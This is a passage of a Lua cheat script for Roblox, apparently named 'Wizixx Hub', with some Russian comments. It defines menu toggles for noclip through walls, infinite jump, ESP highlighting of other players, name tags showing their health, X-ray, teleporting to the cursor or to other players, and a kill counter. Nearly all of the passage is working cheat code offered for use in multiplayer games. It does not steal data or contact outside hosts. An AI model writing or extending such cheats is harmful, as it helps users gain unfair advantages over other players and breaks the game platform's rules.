CreateToggle(tabs["🦶 MOVEMENT"].frame, "👻 NoClip", "NOCLIP 👻 - Walk through walls", function(state)
    Functions.NoClip = state
    if state then
        local noclipConnection
        noclipConnection = RunService.Stepped:Connect(function()
            if not Functions.NoClip or not LP.Character then noclipConnection:Disconnect() return end
            for _, part in pairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
    end
end)

-- ================== INFINITE JUMP ==================
CreateToggle(tabs["🦶 MOVEMENT"].frame, "🦘 Infinite Jump", "INFINITE JUMP 🦘 - Jump infinitely", function(state)
    Functions.InfiniteJump = state
    if state then
        local jumpConnection
        jumpConnection = UserInputService.JumpRequest:Connect(function()
            if Functions.InfiniteJump and LP.Character and LP.Character:FindFirstChild("Humanoid") then
                LP.Character.Humanoid:ChangeState("Jumping")
            end
        end)
    end
end)

-- ================== ESP ==================
CreateToggle(tabs["👁️ VISUAL"].frame, "👁️ ESP", "ESP 👁️ - Highlight players", function(state)
    Functions.ESP = state
    
    local function AddESP(obj)
        pcall(function()
            local highlight = Instance.new("Highlight")
            highlight.Name = "Wizixx_ESP"
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.3
            highlight.Parent = obj
            table.insert(ESPHighlights, highlight)
        end)
    end
    
    if state then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character then
                AddESP(plr.Character)
            end
        end
    else
        for _, v in pairs(ESPHighlights) do
            pcall(function() v:Destroy() end)
        end
        ESPHighlights = {}
    end
end)

-- ================== NAME TAGS ==================
CreateToggle(tabs["👁️ VISUAL"].frame, "🏷️ Name Tags", "NAME TAGS 🏷️ - Show names and HP above heads", function(state)
    Functions.NameTags = state
    
    if state then
        local function AddNameTag(plr)
            if plr == LP then return end
            if not plr.Character then return end
            
            local head = plr.Character:FindFirstChild("Head")
            if not head then return end
            
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "Wizixx_NameTag"
            billboard.Size = UDim2.new(0, 100, 0, 40)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = head
            
            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
            nameLabel.Position = UDim2.new(0, 0, 0, 0)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = plr.Name
            nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            nameLabel.TextStrokeTransparency = 0
            nameLabel.TextSize = 14
            nameLabel.Font = Enum.Font.GothamBold
            nameLabel.Parent = billboard
            
            local hpLabel = Instance.new("TextLabel")
            hpLabel.Size = UDim2.new(1, 0, 0.5, 0)
            hpLabel.Position = UDim2.new(0, 0, 0.5, 0)
            hpLabel.BackgroundTransparency = 1
            hpLabel.Text = "HP: 100"
            hpLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
            hpLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            hpLabel.TextStrokeTransparency = 0
            hpLabel.TextSize = 12
            hpLabel.Font = Enum.Font.Gotham
            hpLabel.Parent = billboard
            
            table.insert(NameTagList, {billboard = billboard, hpLabel = hpLabel, plr = plr})
        end
        
        for _, plr in pairs(Players:GetPlayers()) do
            AddNameTag(plr)
        end
        
        local hpConnection
        hpConnection = RunService.Heartbeat:Connect(function()
            if not Functions.NameTags then hpConnection:Disconnect() return end
            
            for _, tag in pairs(NameTagList) do
                if tag.plr and tag.plr.Character and tag.plr.Character:FindFirstChild("Humanoid") then
                    local hum = tag.plr.Character.Humanoid
                    tag.hpLabel.Text = "HP: " .. math.floor(hum.Health)
                    tag.hpLabel.TextColor3 = Color3.fromRGB(255 * (1 - hum.Health/hum.MaxHealth), 255 * (hum.Health/hum.MaxHealth), 0)
                end
            end
        end)
    else
        for _, v in pairs(NameTagList) do
            pcall(function() v.billboard:Destroy() end)
        end
        NameTagList = {}
    end
end)

-- ================== XRAY ==================
CreateToggle(tabs["👁️ VISUAL"].frame, "🔮 X-Ray", "X-RAY 🔮 - See through walls", function(state)
    Functions.XRay = state
    
    if state then
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v:FindFirstChild("Wizixx_OriginalTransparency") then
                local trans = Instance.new("NumberValue")
                trans.Name = "Wizixx_OriginalTransparency"
                trans.Value = v.Transparency
                trans.Parent = v
                
                if v.Transparency < 0.8 then
                    v.Transparency = 0.5
                end
            end
        end
    else
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:FindFirstChild("Wizixx_OriginalTransparency") then
                v.Transparency = v.Wizixx_OriginalTransparency.Value
                v.Wizixx_OriginalTransparency:Destroy()
            end
        end
    end
end)

-- ================== CLICK TP ==================
CreateToggle(tabs["🌍 WORLD"].frame, "🖱️ Click TP", "CLICK TP 🖱️ - Hold tool, click to teleport", function(state)
    Functions.ClickTP = state
    
    if state then
        local holdingTool = false
        
        local function checkTool()
            if LP.Character then
                for _, tool in pairs(LP.Character:GetChildren()) do
                    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                        return true
                    end
                end
            end
            return false
        end
        
        Mouse.Button1Down:Connect(function()
            if Functions.ClickTP and checkTool() then
                holdingTool = true
            end
        end)
        
        Mouse.Button1Up:Connect(function()
            holdingTool = false
        end)
        
        Mouse.Button1Click:Connect(function()
            if holdingTool and Mouse.Hit and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                LP.Character.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 3, 0)
            end
        end)
    end
end)

-- ================== TELEPORT TO PLAYER ==================
CreateToggle(tabs["🌍 WORLD"].frame, "👤 TP to Player", "TP TO PLAYER 👤 - Teleport to selected player", function(state)
    Functions.TeleportToPlayer = state
    
    if state then
        local playerList = Instance.new("Frame")
        playerList.Size = UDim2.new(0, 200, 0, 300)
        playerList.Position = UDim2.new(0, 10, 0, 100)
        playerList.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        playerList.Parent = ScreenGui
        
        local listScroll = Instance.new("ScrollingFrame")
        listScroll.Size = UDim2.new(1, -10, 1, -10)
        listScroll.Position = UDim2.new(0, 5, 0, 5)
        listScroll.BackgroundTransparency = 1
        listScroll.Parent = playerList
        
        local y = 0
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LP then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, 0, 0, 30)
                btn.Position = UDim2.new(0, 0, 0, y)
                btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                btn.Text = plr.Name
                btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                btn.Parent = listScroll
                
                btn.MouseButton1Click:Connect(function()
                    if LP.Character and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        LP.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                    end
                end)
                
                y = y + 35
            end
        end
        listScroll.CanvasSize = UDim2.new(0, 0, 0, y)
        
        Functions.TeleportList = playerList
    else
        if Functions.TeleportList then
            Functions.TeleportList:Destroy()
            Functions.TeleportList = nil
        end
    end
end)

-- ================== TELEPORT TO CURSOR ==================
CreateToggle(tabs["🌍 WORLD"].frame, "📍 TP to Cursor (T)", "TP TO CURSOR 📍 - Press T to teleport to cursor", function(state)
    Functions.TeleportToCursor = state
    
    if state then
        local tpConnection
        tpConnection = UserInputService.InputBegan:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.T and Functions.TeleportToCursor then
                if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and Mouse.Hit then
                    LP.Character.HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 3, 0)
                end
            end
        end)
    end
end)

-- ================== KILL COUNTER ==================
local KillCounterFrame = Instance.new("Frame")
KillCounterFrame.Size = UDim2.new(0, 120, 0, 50)
KillCounterFrame.Position = UDim2.new(0, 20, 1, -70)
KillCounterFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KillCounterFrame.BackgroundTransparency = 0.3
KillCounterFrame.BorderSizePixel = 2
KillCounterFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
KillCounterFrame.Active = true
KillCounterFrame.Draggable = true
KillCounterFrame.ZIndex = 50
KillCounterFrame.Parent = ScreenGui

local KillCounterCorner = Instance.new("UICorner")
KillCounterCorner.CornerRadius = UDim.new(0, 8)
KillCounterCorner.Parent = KillCounterFrame

local KillCounterLabel = Instance.new("TextLabel")
KillCounterLabel.Size = UDim2.new(1, 0, 1, 0)
KillCounterLabel.BackgroundTransparency = 1
KillCounterLabel.Text = "💀 Kills: 0"
KillCounterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
KillCounterLabel.TextSize = 16
KillCounterLabel.Font = Enum.Font.GothamBold
KillCounterLabel.TextXAlignment = Enum.TextXAlignment.Center
KillCounterLabel.ZIndex = 51
KillCounterLabel.Parent = KillCounterFrame

-- ToolTip для Kill Counter
KillCounterFrame.MouseEnter:Connect(function()
    ShowToolTip("KILL COUNTER 💀 - Shows your kills")
end)
KillCounterFrame.MouseLeave:Connect(HideToolTip)

-- ================== ЗВУКИ ==================
local HitSounds = {
    Pop = "rbxassetid://9120382277",
    Ding = "rbxassetid://9120382355",
    Click = "rbxassetid://9120382422",
    Beep = "rbxassetid://9120382488"
}

local KillSounds = {
    Ting = "rbxassetid://9120382566",
    Explosion = "rbxassetid://9120382633",
    Bell = "rbxassetid://9120382700",
    Coin = "rbxassetid://9120382766",
    Oof = "rbxassetid://9120382833"
}

local function PlaySound(soundId, volume)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Volume = volume or Functions.Volume
    sound.Parent = Workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 2)
end

-- Детектор убийств
local lastHealth = {}
RunService.Heartbeat:Connect(function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and plr.Character:FindFirstChild("Humanoid") then
            local hum = plr.Character.Humanoid
            if lastHealth[plr] and lastHealth[plr] > 0 and hum.Health <= 0 then
                Functions.KillCounter = Functions.KillCounter + 1
                KillCounterLabel.Text = "💀 Kills: " .. Functions.KillCounter
                PlaySound(KillSounds[Functions.KillSound], Functions.Volume)
            end
            lastHealth[plr] = hum.Health
        end
    end
end)

-- ================== TOGGLE GUI НА ПРАВЫЙ SHIFT ==================
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

-- ================== ОБНОВЛЕНИЕ CANVAS SIZE ==================
for _, tab in pairs(tabs) do
    tab.frame.CanvasSize = UDim2.new(0, 0, 0, tab.layout.AbsoluteContentSize.Y + 20)
end

print([[
╔═══════════════════════════════════════╗
║     WIZIXX HUB [14.02.2026]           ║
╠═══════════════════════════════════════╣
║ ✅ TOOL TIPS - Работают!              ║
║ ✅ FREECAM - Обычная (WASD + Shift)   ║
║ ✅ FREECAM TP - Телепорт камерой      ║
║ ✅ SPIDER - Лазанье по стенам         ║
║ ✅ DASH - Рывок (LeftControl)         ║
║ ✅ STRAFE - Толчок при прыжке         ║
║ ✅ 30+ функций                        ║
╚═══════════════════════════════════════╝
]])
